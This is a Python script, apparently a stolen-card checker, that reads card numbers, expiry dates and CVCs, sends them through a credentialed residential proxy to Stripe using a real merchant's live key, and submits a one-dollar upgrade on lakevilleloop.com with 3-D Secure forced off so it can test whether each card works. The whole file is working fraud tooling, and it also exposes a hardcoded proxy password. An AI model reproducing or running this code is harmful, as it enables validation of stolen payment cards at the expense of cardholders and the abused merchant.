import requests,re
from proxy import reqproxy, make_request
def Tele(ccx):
	proxy_str = "brd.superproxy.io:33335:brd-customer-hl_306de257-zone-web_scrapping:e7l003m6w1ks"
	session, ip = reqproxy(proxy_str)
	#print(f"IP Address: {ip}")
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&billing_details[email]=rodamuser08%40gmail.com&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=1e245c59-b3c1-4ff9-a09f-db1ae116ea9834ff9b&muid=7817d661-cdcc-428c-8213-81d6bfc349cf853f5c&sid=0abfca6b-4b0e-47e8-b6e6-8850ad0582da352a12&pasted_fields=number&payment_user_agent=stripe.js%2Fe9b153e2b2%3B+stripe-js-v3%2Fe9b153e2b2%3B+card-element&referrer=https%3A%2F%2Fwww.lakevilleloop.com&time_on_page=24877&key=pk_live_51IekcQKHPFAlBzyyGNBguT5BEI7NEBqrTxJhsYN1FI1lQb9iWxU5U2OXfi744NEMx5p7EDXh08YXrudrZkkG9bGc00ZCrkXrxL&_stripe_account=acct_1QWTt72eZhqoVEdg'
	
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = r1.json()['id']
	
	headers = {
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
	    'Referer': 'https://www.lakevilleloop.com/upgrade',
	    'baggage': 'sentry-environment=production,sentry-release=0200fcbac0397b5e171e5ab24935e821998b6f05,sentry-public_key=35c3cc890abe9dbb51e6e513fcd6bbca,sentry-trace_id=172fa041bd44483f8032d39df9bed423,sentry-sample_rate=0,sentry-transaction=routes%2Fupgrade,sentry-sampled=false',
	    'sentry-trace': '172fa041bd44483f8032d39df9bed423-98591f983a514e31-0',
	    'sec-ch-ua-platform': '"Android"',
	}
	
	params = {
	    '_data': 'routes/upgrade',
	}
	
	data = [
	    ('email', 'rodamuser08@gmail.com'),
	    ('force_three_d_secure', 'false'),
	    ('price_id', 'a2222f37-7c96-4f31-9e91-26a330b28b88'),
	    ('premium_offer_id', ''),
	    ('last_resource_guid', ''),
	    ('upgrade_error_message', 'Oops, something went wrong.'),
	    ('upgrade_success_message', 'You are now a premium subscriber'),
	    ('payment_method', pm),
	    ('email', 'rodamuser08@gmail.com'),
	    ('tax_id', ''),
	    ('tax_id_type', ''),
	    ('amount_cents', '100'),
	]
	
	r2 = session.post('https://www.lakevilleloop.com/upgrade', params=params, headers=headers, data=data)
	
	result2 = r2.text
	return result2
